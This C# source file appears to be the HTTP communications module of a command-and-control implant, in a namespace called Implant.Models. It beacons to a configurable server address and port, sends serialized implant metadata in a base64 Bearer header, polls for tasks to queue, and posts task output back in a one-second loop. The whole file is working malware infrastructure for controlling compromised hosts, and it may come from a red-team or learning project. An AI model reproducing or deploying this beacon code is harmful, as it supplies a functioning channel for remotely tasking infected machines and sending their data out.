using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using static Implant.Utils.Extensions;

namespace Implant.Models
{
    public class HTTPComms : Comms
    {

        public string ConnAddr { get; set; }
        public int ConnPort { get; set; }
        public string Schema { get; set; } = "http";

        private CancellationTokenSource _cancelToken;
        private HttpClient _client;

        public HTTPComms(string connAddr, int connPort) {
            ConnAddr = connAddr;
            ConnPort = connPort;
        }

        public override void ImplantInit(ImplantData implantData) {
            base.ImplantInit(implantData);

            _client = new HttpClient();
            _client.BaseAddress = new Uri($"{Schema}://{ConnAddr}:{ConnPort}");
            _client.DefaultRequestHeaders.Clear();

            var encData = Convert.ToBase64String(_implantData.Serialize());

            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encData}");
        }

        public async Task PollImplant() {
            var resp = await _client.GetByteArrayAsync("/");
            HandleResp(resp);
        }

        public void HandleResp(byte[] resp) {
            var tasks = resp.Deserialize<ImplantTask[]>();
            
            if(!(tasks is null) && tasks.Any()) {
                foreach(var task in tasks) { TaskInbound.Enqueue(task); }
            }
        }

        private async Task PostData() {
            var taskOut = GetTaskOut().Serialize();
            var HTTPContent = new StringContent(Encoding.UTF8.GetString(taskOut), Encoding.UTF8, "application/json");
            var resp = await _client.PostAsync("/", HTTPContent);
            var respContent = await resp.Content.ReadAsByteArrayAsync();
            HandleResp(respContent);
        }

        public override async Task Start() {
            _cancelToken = new CancellationTokenSource();
            while (!_cancelToken.IsCancellationRequested)
            {
                if (!TaskOut.IsEmpty){ await PostData(); }
                else { await PollImplant(); }

                // make this option customizable
                await Task.Delay(1000);
            }
        }

        public override void Stop(){ _cancelToken.Cancel(); }

    }
}
